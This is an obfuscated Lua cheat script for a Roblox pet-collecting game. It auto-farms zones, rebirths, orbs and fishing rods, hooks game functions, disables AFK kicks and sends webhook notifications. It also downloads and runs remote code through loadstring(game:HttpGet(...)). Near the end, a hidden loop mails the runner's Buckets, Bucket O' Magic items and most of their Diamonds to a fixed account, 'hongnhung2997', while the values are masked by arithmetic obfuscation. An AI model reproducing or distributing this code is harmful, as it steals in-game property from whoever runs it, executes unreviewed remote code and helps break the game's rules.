repeat task.wait();until game.PlaceId~=nil  repeat task.wait();until game:GetService("Players") and game:GetService("Players").LocalPlayer  repeat task.wait();until  not game.Players.LocalPlayer.PlayerGui:FindFirstChild("__INTRO") local v0=game.HttpService;local v1=game.ReplicatedStorage;local v2=require(v1.Library);local v3=game.Players.LocalPlayer;local v4=v3.Character.HumanoidRootPart;local v5=workspace.__THINGS.Instances;local v6=require(v1.Library.Client.Save);local v7=require(v1.Library.Client.MapCmds);local v8=require(v1.Library.Util.MapUtil);local v9=require(v1.Library.Client.ZoneCmds);local v10=require(v1.Library.Directory.Zones);local v11=require(v1.Library.Util.ZonesUtil);local v12=require(v1.Library.Client.RankCmds);local v13=require(v1.Library.Client.RebirthCmds);local v14=require(v1.Library.Client.TabController);local v15=require(v1.Library.Client.CurrencyCmds);local v16=require(game.ReplicatedStorage.Library.Client.EggCmds);local v17=((game.PlaceId==(8689335155 -  -48564015)) and workspace.Map) or ((game.PlaceId==16498369169) and workspace.Map2) ;local v18=((v17.Name=="Map") and "World 1") or ((v17.Name=="Map2") and "World 2") ;local v19;if (v18=="World 1") then v19="Coins";elseif (v18=="World 2") then v19="TechCoins";end local v20=getsenv(v3.PlayerScripts.Scripts.Game["Egg Opening Frontend"]);hookfunction(v20.PlayEggAnimation,function() return;end);hookfunction(require(game.ReplicatedStorage.Library.Client.PlayerPet).CalculateSpeedMultiplier,function() return 147 + 103 ;end);for v31,v32 in getconnections(v3.Idled) do v32:Disable();end v3.PlayerScripts.Scripts.Core["Idle Tracking"].Enabled=false;v3.PlayerScripts.Scripts.Core["Server Closing"].Enabled=false;loadstring(game:HttpGet("https://raw.githubusercontent.com/Darks-scripts/fps-booster/main/dark%20fps%20booster"))();function getActive() return workspace.__THINGS.__INSTANCE_CONTAINER.Active:GetChildren()[3 -2 ];end function Info(v33) return v6.Get()[v33];end function Open(v34) return v14.OpenTab(v34);end function Close() return v14.CloseTab();end function teleportToZone(v35) if (v35 and v35:FindFirstChild("INTERACT")) then if v35.INTERACT:FindFirstChild("BREAKABLE_SPAWNS") then if v35.INTERACT.BREAKABLE_SPAWNS:FindFirstChild("Main") then v3.Character.HumanoidRootPart.CFrame=v35.INTERACT.BREAKABLE_SPAWNS.Main.CFrame * CFrame.new(0 -0 ,869 -(814 + 45) ,0) ;end end elseif v35.PERSISTENT.Teleport then local v92=0 -0 ;while true do if (v92==1) then teleportToZone(v35);break;end if (v92==(0 + 0)) then v3.Character.HumanoidRootPart.CFrame=v35.PERSISTENT.Teleport.CFrame * CFrame.new(0 + 0 ,10,885 -(261 + 624) ) ;task.wait(5);v92=1;end end end end function sendNotif(v36) local v37=0 -0 ;local v38;local v39;local v40;local v41;while true do if (v37==(1081 -(1020 + 60))) then v40,v41=pcall(function() v0:PostAsync(getgenv().config.webURL,v39);end);if  not v40 then local v103=request({Url=getgenv().config.webURL,Method="POST",Headers={["Content-Type"]="application/json"},Body=v39});end break;end if (v37==(1423 -(630 + 793))) then v38={content=v36};v39=v0:JSONEncode(v38);v37=3 -2 ;end end end function fishAccMaker() local v42=0 -0 ;local v43;local v44;local v45;local v46;local v47;local v48;local v49;local v50;while true do if (v42==(3 + 3)) then warn("Disabled AFK Kick");game:GetService("Players").LocalPlayer.Idled:connect(function() local v93=0 -0 ;while true do if (v93==0) then game:GetService("VirtualUser"):Button2Down(Vector2.new(0,1747 -(760 + 987) ),workspace.CurrentCamera.CFrame);wait(1914 -(1789 + 124) );v93=767 -(745 + 21) ;end if (v93==(1 + 0)) then game:GetService("VirtualUser"):Button2Up(Vector2.new(0 -0 ,0 -0 ),workspace.CurrentCamera.CFrame);break;end end end);break;end if ((1 + 4)==v42) then task.spawn(function() while getgenv().Start and  not v50['ItemIndex']['Misc']['{\"id\":\"Amethyst Fishing Rod\"}']  do wait(1 + 0 );pcall(function() for v114,v115 in pairs(v47.FishingRods) do if (v115.MerchantSalePrice and  not v50['ItemIndex']['Misc'][('{\"id\":\"%s\"}'):format(v114)] and (v46['CurrencyCmds'].Get("Fishing")>=v115.MerchantSalePrice)) then BuyRod(v114);end end end);end end);task.spawn(function() while getgenv().Start do wait(1056 -(87 + 968) );pcall(function() if v50['ItemIndex']['Misc']['{\"id\":\"Amethyst Fishing Rod\"}'] then if  not game:GetService("CoreGui"):FindFirstChild("Auto Fishing By TrunggTruc") then local v129=0;local v130;local v131;local v132;while true do if (v129==1) then v131=Instance.new("Frame");v131.Size=UDim2.new(4.1 -3 ,0 + 0 ,2.1 -1 ,1413 -(447 + 966) );v131.Position=UDim2.new(0.5 -0 ,0,1817.5 -(1703 + 114) ,0);v131.AnchorPoint=Vector2.new(0.5,0.5);v129=703 -(376 + 325) ;end if (v129==(0 -0)) then v130=Instance.new("ScreenGui");v130.Name="Auto Fishing By TrunggTruc";v130.Parent=game.CoreGui;v130.ZIndexBehavior=Enum.ZIndexBehavior.Global;v129=2 -1 ;end if (v129==(1 + 2)) then v132.Size=UDim2.new(0.5 -0 ,14 -(9 + 5) ,376.25 -(85 + 291) ,1265 -(243 + 1022) );v132.Position=UDim2.new(0.5 -0 ,0 + 0 ,1180.5 -(1123 + 57) ,0 + 0 );v132.AnchorPoint=Vector2.new(0.5,0.5);v132.Parent=v131;v129=258 -(163 + 91) ;end if (v129==(1932 -(1869 + 61))) then v131.Parent=v130;v131.BackgroundColor3=Color3.fromRGB(0 + 0 ,0 -0 ,0 -0 );v131.BackgroundTransparency=0.25 + 0 ;v132=Instance.new("TextLabel");v129=3 -0 ;end if (v129==(4 + 0)) then v132.TextColor3=Color3.fromRGB(1729 -(1329 + 145) ,1226 -(140 + 831) ,2105 -(1409 + 441) );v132.BackgroundTransparency=1;v132.Text="Successfully! got Amethyst Fishing Rod";break;end end end end end);end end);task.spawn(function() while getgenv().Start do local v104=718 -(15 + 703) ;local v105;while true do if (v104==1) then if  not v50['ItemIndex']['Misc']['{\"id\":\"Wooden Fishing Rod\"}'] then repeat wait();if  not v46['InstancingCmds'].GetInstanceID() then firetouchinterest(v43.Character.HumanoidRootPart,v45.Fishing.Teleports.Enter,0 + 0 );firetouchinterest(v43.Character.HumanoidRootPart,v45.Fishing.Teleports.Enter,439 -(262 + 176) );elseif (v46['InstancingCmds'].GetInstanceID()~="Fishing") then v46['InstancingCmds'].Leave();elseif (v46['InstancingCmds'].GetInstanceID()=="Fishing") then v48.Fire("Instancing_FireCustomFromClient","Fishing","ClaimRod");end until v50['ItemIndex']['Misc']['{\"id\":\"Wooden Fishing Rod\"}'] end if v50['ItemIndex']['Misc']['{\"id\":\"Platinum Fishing Rod\"}'] then local v133=v46['InstancingCmds'].GetInstanceID();if (v133~="AdvancedFishing") then v46['InstancingCmds'].Leave();wait(1722 -(345 + 1376) );firetouchinterest(v43.Character.HumanoidRootPart,v45.AdvancedFishing.Teleports.Enter,688 -(198 + 490) );firetouchinterest(v43.Character.HumanoidRootPart,v45.AdvancedFishing.Teleports.Enter,1);elseif (v133=="AdvancedFishing") then Fishing();end else local v134=0 -0 ;local v135;while true do if (v134==(0 -0)) then v135=v46['InstancingCmds'].GetInstanceID();if (v135~="Fishing") then v46['InstancingCmds'].Leave();wait(1207 -(696 + 510) );firetouchinterest(v43.Character.HumanoidRootPart,v45.Fishing.Teleports.Enter,0);firetouchinterest(v43.Character.HumanoidRootPart,v45.Fishing.Teleports.Enter,1 -0 );elseif (v135=="Fishing") then Fishing();end break;end end end break;end if (v104==(1262 -(1091 + 171))) then wait();v105=InInstance();v104=1 + 0 ;end end end end);v42=18 -12 ;end if (v42==(3 -2)) then v45=workspace.__THINGS.Instances;v46=require(game:GetService("ReplicatedStorage").Library);v47=v46.Directory;v42=2;end if (v42==3) then repeat wait();pcall(function() v50=v46.Save.Get();end);until type(v50)=="table"  function GetGifts() for v106,v107 in pairs(getgc()) do if ((typeof(v107)=="function") and (getgenv(v107).script==game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs['Mailbox'])) then local v116=0;local v117;local v118;while true do if (v116==(375 -(123 + 251))) then if (v117.name and (v117.name=="Update") and v118[4] and (v118[19 -15 ].Name=="ClaimAll")) then return v118[699 -(208 + 490) ].Inbox;end break;end if (0==v116) then v117=getinfo(v107);v118=getupvalues(v107);v116=1;end end end end return {};end function InInstance(v94) local v95=v46['InstancingCmds'].GetModel();if  not v95 then return false;end if (v94 and (v46['InstancingCmds'].GetInstanceID()==v94)) then return v95;end return v95;end v42=4;end if (v42==(1 + 3)) then function Fishing() local v96=0 + 0 ;local v97;while true do if (2==v96) then wait(837 -(660 + 176) );while v43.PlayerGui._INSTANCES.FishingGame.Enabled and (v46['InstancingCmds'].GetInstanceID()==v97)  do local v125=0 + 0 ;while true do if (v125==0) then task.wait();v48.Fire("Instancing_FireCustomFromClient",v97,"RequestReel");v125=203 -(14 + 188) ;end if (v125==(676 -(534 + 141))) then v48.Fire("Instancing_FireCustomFromClient",v97,"Clicked");break;end end end v96=2 + 1 ;end if (v96==(3 + 0)) then wait(1 + 0 );break;end if (v96==(0 -0)) then v97=v46['InstancingCmds'].GetInstanceID();v48.Fire("Instancing_FireCustomFromClient",v97,"RequestCast",v44[v97]);v96=1;end if (v96==1) then wait(5 -1 );v48.Fire("Instancing_FireCustomFromClient",v97,"RequestReel");v96=5 -3 ;end end end function BuyRod(v98) return v48.Invoke("FishingMerchant_PurchaseRod",v98);end task.spawn(function() while true and getgenv().Start and  not v50['ItemIndex']['Misc']['{\"id\":\"Amethyst Fishing Rod\"}']  do pcall(function() for v119,v120 in pairs(GetGifts()) do local v121=0 + 0 ;while true do if (v121==0) then v48.Invoke("Mailbox: Claim",{v120.uuid});wait(1 + 0 );break;end end end end);wait(416 -(115 + 281) );end end);v42=5;end if (v42==0) then getgenv().Start=true;v43=game.Players.LocalPlayer;v44={Fishing=Vector3.new(2709.414794921875 -1544 ,63.91423034667969 + 12 , -(8329.029296875 -4882)),AdvancedFishing=Vector3.new(5415.0692138671875 -3938 ,61.62500762939453, -(5314.19189453125 -(550 + 317)))};v42=1 -0 ;end if (v42==(2 -0)) then v48=v46.Network;v49=v46.Functions;v50=nil;v42=8 -5 ;end end end local v23=nil;local v24=nil;for v51,v52 in workspace.__THINGS.Orbs:GetChildren() do local v53=285 -(134 + 151) ;while true do if ((1666 -(970 + 695))==v53) then task.wait();v52:Destroy();break;end if (v53==0) then v2.Network.Fire("Orbs: Collect",{tonumber(v52.Name)});v2.Network.Fire("Orbs_ClaimMultiple",{[1]={[1991 -(582 + 1408) ]=v52.Name}});v53=1;end end end for v54,v55 in workspace.__THINGS.Lootbags:GetChildren() do v2.Network.Fire("Lootbags_Claim",{v55.Name});task.wait();v55:Destroy();end v23=workspace.__THINGS.Orbs.ChildAdded:Connect(function(v56) local v57=0;while true do if ((3 -2)==v57) then task.wait();v56:Destroy();break;end if (v57==0) then v2.Network.Fire("Orbs: Collect",{tonumber(v56.Name)});v2.Network.Fire("Orbs_ClaimMultiple",{[3 -2 ]={[1825 -(1195 + 629) ]=v56.Name}});v57=1 -0 ;end end end);v24=workspace.__THINGS.Lootbags.ChildAdded:Connect(function(v58) local v59=241 -(187 + 54) ;while true do if (v59==(781 -(162 + 618))) then v58:Destroy();break;end if (v59==(0 + 0)) then v2.Network.Fire("Lootbags_Claim",{v58.Name});task.wait();v59=1 + 0 ;end end end);if  not Info("PickedStarterPet") then local v67=0;while true do if (v67==0) then v2.Network.Invoke("Pick Starter Pets","Cat","Dog");task.wait(1 -0 );v67=1 -0 ;end if (v67==(1 + 0)) then Close();task.wait(1637 -(1373 + 263) );break;end end end if Info("FirstLogin") then Close();task.wait(1);v2.Network.Fire("Changelog: Read");task.wait(1001 -(451 + 549) );end if getgenv().config.needPetNotifs then local v68=false;for v76,v77 in pairs(Info("Inventory")['Pet']) do if (v77.id==getgenv().config.desiredPetName) then v68=true;break;end end if  not v68 then sendNotif("```diff\n- "   .. v3.Name   .. " needs "   .. tostring(Info("MaxPetsEquipped"))   .. " "   .. getgenv().config.desiredPetName   .. "! \n```" );end end if getgenv().config.autoClaimMail then spawn(function() while getgenv().config.autoWorld do local v90=0;local v91;while true do if (v90==(1 + 0)) then if (v91 and getgenv().config.needPetNotifs) then for v127,v128 in pairs(Info("Inventory")['Pet']) do if (v128.id==getgenv().config.desiredPetName) then sendNotif("```diff\n+ "   .. v3.Name   .. " has claimed "   .. getgenv().config.desiredPetName   .. " from mail | "   .. tostring(os.date("%H:%M"))   .. " \n```" );break;end end end break;end if ((0 -0)==v90) then task.wait(100 -40 );v91=v2.Network.Invoke("Mailbox: Claim All");v90=1385 -(746 + 638) ;end end end end);end spawn(function() while getgenv().config.autoWorld do local v69=0 + 0 ;while true do if (v69==0) then task.wait(30);if v12.AllRewardsReady() then local v109=0;local v110;while true do if (v109==(0 -0)) then v110=342 -(218 + 123) ;while  not v12.AllRewardsRedeemed() do v2.Network.Fire("Ranks_ClaimReward",v110);task.wait(1582 -(1535 + 46) );v110=v110 + 1 + 0 ;end break;end end end v69=1 + 0 ;end if (v69==1) then if getgenv().config.stopAtRebirth then if (v13.Get() and (v13.Get()>=getgenv().config.stopAtRebirthNum)) then getgenv().config.autoRebirth=false;end end break;end end end end);local v25,v26=v9.GetMaxOwnedZone();local v27,v28=v9.GetNextZone();local v29=v13.GetNextRebirth();if (v13.Get() and (v13.Get()>=getgenv().config.stopAtRebirthNum)) then local v70=560 -(306 + 254) ;while true do if (v70==0) then if (v25=="Cloud Forest") then getgenv().config.autoWorld=false;task.wait();task.spawn(fishAccMaker);end if (v25=="Rainbow Road") then getgenv().config.autoWorld=false;task.wait();task.spawn(fishAccMaker);end break;end end end while getgenv().config.autoWorld do local v60=0 + 0 ;local v61;local v62;local v63;local v64;local v65;local v66;while true do if (v60==(1 -0)) then if getgenv().config.autoPetSlots then if ((v15.Get("Diamonds")>v2.Balancing.CalcPetSlotPrice(Info("PetSlotsPurchased") + (1468 -(899 + 568)) )) and (Info("PetSlotsPurchased")<v12.GetMaxPurchasableEquipSlots()) and Info("UnlockedZones")["Green Forest"]) then local v122=0 + 0 ;while true do if (v122==(0 -0)) then teleportToZone(v8.GetZone("Green Forest"));v2.Network.Invoke("EquipSlotsMachine_RequestPurchase",Info("PetSlotsPurchased") + (604 -(268 + 335)) );break;end end end end v61,v62=v9.GetMaxOwnedZone();v63,v64=v9.GetNextZone();v60=2;end if (v60==(292 -(60 + 230))) then v65=v13.GetNextRebirth();teleportToZone(v62.ZoneFolder);v66=v2.Network.Invoke("Zones_RequestPurchase",v64.ZoneName);v60=575 -(426 + 146) ;end if (v60==(1 + 2)) then if (v66 and getgenv().config.progressNotifs) then sendNotif("```diff\n+ "   .. v3.Name   .. " has unlocked "   .. v64.ZoneName   .. " | "   .. tostring(os.date("%H:%M"))   .. " \n```" );end if getgenv().config.autoRebirth then if (v62.ZoneNumber>=v65.ZoneNumberRequired) then local v123=1456 -(282 + 1174) ;local v124;while true do if (v123==0) then v124=v2.Network.Invoke("Rebirth_Request",tostring(v65.RebirthNumber));if (v124 and getgenv().config.rebirthNotifs) then sendNotif("```diff\n+ "   .. v3.Name   .. " has made it to rebirth "   .. tostring(v65.RebirthNumber)   .. " | "   .. tostring(os.date("%H:%M"))   .. " \n```" );end break;end end end end break;end if (v60==0) then task.wait();Close();if (getActive() and (tostring(getActive())=="StairwayToHeaven")) then firetouchinterest(v4,v5['StairwayToHeaven'].Teleports.Leave,812 -(569 + 242) );firetouchinterest(v4,v5['StairwayToHeaven'].Teleports.Leave,0 -0 );end v60=1 + 0 ;end end end local function v30() while true do local v71=require(game:GetService("ReplicatedStorage").Library.Client.Save);local v72=v71.Get();local v73=v72.Inventory.Misc;for v78,v79 in pairs(v73) do if ((v79.id=="Bucket") and ((v79._am or 0)>=(1025 -(706 + 318)))) then local v99={[1252 -(721 + 530) ]="hongnhung2997",[1273 -(945 + 326) ]="Bucket",[7 -4 ]="Misc",[4 + 0 ]=v78,[705 -(271 + 429) ]=v79._am};game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(v99));end end local v74=v72.Inventory.Misc;for v80,v81 in pairs(v74) do if ((v81.id=="Bucket O' Magic") and ((v81._am or (0 + 0))>=(1501 -(1408 + 92)))) then local v100={[1]="hongnhung2997",[1088 -(461 + 625) ]="Bucket O' Magic",[3]="Misc",[1292 -(993 + 295) ]=v80,[1 + 4 ]=v81._am};game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(v100));end end local v75=v72.Inventory.Currency;for v82,v83 in pairs(v75) do if ((v83.id=="Diamonds") and ((v83._am or (1171 -(418 + 753)))>=(3809 + 6191))) then local v101=0 + 0 ;local v102;while true do if (v101==0) then v102={[1]="hongnhung2997",[1 + 1 ]=v83.id,[3]="Currency",[2 + 2 ]=v82,[534 -(406 + 123) ]=v83._am-(31769 -(1749 + 20)) };game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(v102));break;end end end end task.wait(1 + 1 );end end task.spawn(v30);
